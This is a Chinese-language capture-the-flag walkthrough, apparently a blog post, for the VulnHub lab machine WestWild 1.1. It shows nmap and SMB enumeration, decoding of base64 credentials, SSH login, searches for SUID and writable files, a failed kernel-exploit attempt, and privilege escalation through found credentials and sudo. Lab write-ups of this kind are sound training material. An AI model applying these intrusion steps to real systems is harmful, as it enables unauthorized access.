---
title: WestWild-1.1
author: Creexile
date: 2024-12-31 18:27:39
lastMod: 2024-12-31
summary: 'easyNo.4'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [提权, 横向移动, 渗透]
---

# WestWild: 1.1

---

easyNo.4

> 来源: [vulnhub靶场-WestWild: 1.1](https://www.vulnhub.com/entry/westwild-11,338/)
>
> 目标: 反正就是拿到root
>
> 提示: 没有
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.17

## 信息收集

nmap

```
nmap -sS 192.168.56.0/24

Nmap scan report for 192.168.56.17
Host is up (0.00011s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)
```

访问80端口, 提示如下; 目录扫描没东西, 源代码也没东西, 那就放在一边吧

```
This is so easy you just have to follow the wave
```

哇, 是smb服务, 我们有救了

```
smbmap -H 192.168.56.17
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231173100.png)

那确实是wave, 那就看看有什么呗

```
smbclient //192.168.56.17/wave
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231173354.png)

`FLAG1.txt`中是一段base64, 且message中提到了他忘记了密码想要重置; 解码base64发现是flag和账密

```bash
RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K
# 结果
Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
user:wavex
password:door+open
```

## getshell

尝试用账密登录ssh, 成功登录

```bash
ssh wavex@192.168.56.17
door+open
```

## 信息收集

```bash
# 系统信息 Linux WestWild 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux
uname -a
# 内核版本 4.4.0-142-generic
uname -r
# 查看环境
python -h
nc -h
# 查看特权文件, ping?
find / -perm -4000 2>/dev/null
# 看看权限, 无发现
sudo -l
# 看看计划任务, 发现有东西
cat /etc/crontab
```

在用户目录下有个wave文件夹, 里面有`FLAG1.txt`和`message`, 没啥用

查看`home`看看有没有别的用户, 发现有aveng, 然后没东西了

看看什么地方能写

```bash
find / -writable -type f ! -path '/proc/*' 2>/dev/null
# 可疑文件
/usr/share/av/westsidesecret/ififoregt.sh
```

## 提权

既然是4.4.0内核, 先来试试`linux/local/45010.c`

哈哈, 是`-bash: ./45010: cannot execute binary file: Exec format error`, 我们没救了

> gcc没问题, 大概率是64位和32位问题, 这个文件不能编译为32位的文件

老老实实看看可疑文件

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231181523.png)

是账号密码! 我们又有救了, 直接su切换用户

```
aveng : kaizen+80
```

再收集一下, 发现有sudo权限, 唉那就不收集了, 结束战斗

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231182335.png)

```
sudo /bin/bash
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241231182419.png)
